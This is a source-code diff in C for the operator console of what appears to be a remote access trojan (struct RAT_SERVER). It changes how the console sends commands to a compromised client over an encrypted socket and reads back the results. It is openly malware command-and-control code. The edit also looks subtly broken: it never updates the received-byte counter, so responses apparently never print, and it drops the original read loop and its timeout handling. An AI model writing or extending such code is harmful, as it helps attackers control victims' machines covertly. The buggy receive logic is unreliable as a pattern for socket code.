@@ -337,79 +337,24 @@ void receive_response(RAT_SERVER *server) {
         return;
     }
     
-    // Save original timeout, set 1s timeout for reading, then restore
-#ifdef _WIN32
-    DWORD orig_timeout = 0;
-    int orig_len = sizeof(orig_timeout);
-    getsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&orig_timeout, &orig_len);
-    DWORD timeout = 1000;
-    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
-#else
-    struct timeval orig_timeout;
-    socklen_t orig_len = sizeof(orig_timeout);
-    getsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &orig_timeout, &orig_len);
-    struct timeval timeout;
-    timeout.tv_sec = 1;
-    timeout.tv_usec = 0;
-    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
-#endif
+    // Read the full response in a single recv (client sends it all at once)
+    memset(buffer, 0, BUFFER_SIZE);
+    bytes_received = crypto_recv(server->client_fd, &server->crypto_ctx, buffer, BUFFER_SIZE - 1, 0);
     
-    while (total_received < max_response_size) {
-        memset(buffer, 0, BUFFER_SIZE);
-        bytes_received = crypto_recv(server->client_fd, &server->crypto_ctx, buffer, BUFFER_SIZE - 1, 0);
-        
-        if (bytes_received > 0) {
-            buffer[bytes_received] = '\0';
-            
-            // Check if we have space to append
-            if (total_received + bytes_received < max_response_size) {
-                strcat(full_response, buffer);
-                total_received += bytes_received;
-            } else {
-                // Truncate if response is too large
-                strncat(full_response, buffer, max_response_size - total_received - 1);
-                total_received = max_response_size - 1;
-                strcat(full_response, "\n[Output truncated - too large]");
-                break;
-            }
-            
-            // If this is a small packet, it's likely the end
-            if (bytes_received < BUFFER_SIZE - 1) {
-                break;
-            }
-        } else if (bytes_received == 0) {
-            printf("\nClient disconnected\n");
-            server->client_fd = INVALID_SOCKET;
-            break;
+    if (bytes_received > 0) {
+        buffer[bytes_received] = '\0';
+        if (bytes_received <= max_response_size) {
+            strcat(full_response, buffer);
         } else {
-            // Error or timeout
-#ifdef _WIN32
-            int error = WSAGetLastError();
-            if (error == WSAETIMEDOUT) {
-                break;
-            } else {
-                printf("Error receiving data from client (WSA Error: %d)\n", error);
-                server->client_fd = INVALID_SOCKET;
-                break;
-            }
-#else
-            if (errno == EAGAIN || errno == EWOULDBLOCK) {
-                break;
-            } else {
-                perror("Error receiving data from client");
-                server->client_fd = INVALID_SOCKET;
-                break;
-            }
-#endif
+            strncat(full_response, buffer, max_response_size - 1);
         }
+    } else if (bytes_received == 0) {
+        printf("\nClient disconnected\n");
+        server->client_fd = INVALID_SOCKET;
+    } else {
+        perror("Error receiving data from client");
+        server->client_fd = INVALID_SOCKET;
     }
-    
-    // Restore original timeout
-#ifdef _WIN32
-    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&orig_timeout, sizeof(orig_timeout));
-#else
-    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &orig_timeout, sizeof(orig_timeout));
-#endif
     
     if (total_received > 0) {
         printf("%s", full_response);
@@ -648,7 +593,6 @@ void execute_commands(RAT_SERVER *server) {
     // Wait for initial prompt from client
     printf("Waiting for client prompt...\n");
     receive_response(server);
-    printf("\n");
     
     while (1) {
         // Check if connection is still valid
@@ -657,9 +601,7 @@ void execute_commands(RAT_SERVER *server) {
             break;
         }
         
-        printf(">> ");
-        fflush(stdout);
-        
+        // Client prompt is already displayed by receive_response above
         if (!fgets(command, sizeof(command), stdin)) {
             if (feof(stdin)) {
                 printf("\nEnd of input. Exiting...\n");
@@ -708,7 +650,6 @@ void execute_commands(RAT_SERVER *server) {
                 // Wait for confirmation from client
                 if (server->client_fd != INVALID_SOCKET) {
                     receive_response(server);
-                    printf("\n");
                 }
             }
         }
@@ -730,7 +671,6 @@ void execute_commands(RAT_SERVER *server) {
                 // Wait for confirmation from client
                 if (server->client_fd != INVALID_SOCKET) {
                     receive_response(server);
-                    printf("\n");
                 }
             }
         }
@@ -744,7 +684,6 @@ void execute_commands(RAT_SERVER *server) {
             send_command(server, command);
             if (server->client_fd != INVALID_SOCKET) {
                 receive_response(server);
-                printf("\n");
             }
         }
     }
